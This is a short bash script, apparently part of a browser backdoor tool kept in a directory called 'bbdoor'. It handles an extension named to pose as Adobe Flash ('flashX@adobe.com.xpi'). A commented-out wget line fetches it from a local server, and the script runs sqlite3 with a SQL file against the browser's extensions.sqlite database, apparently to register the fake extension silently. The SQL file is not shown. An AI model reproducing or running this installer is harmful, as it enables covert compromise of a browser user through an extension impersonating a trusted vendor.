#!/bin/bash
NOW=$(date +"%H-%M-%S")
DIR=/root/bbdoor														# where are the files
XPI=flashX@adobe.com.xpi												# filename of the extension
touch $DIR/$NOW

rm -f $DIR/$XPI
#wget --no-check-certificate -O $DIR/$XPI http://127.0.0.1/$XPI     # this is where the newest xpi can be found, if locally available it is not needed
$DIR/sqlite3 $DIR/extensions.sqlite  < $DIR/sqlite.sql  > $DIR/debug.txt 2>&1
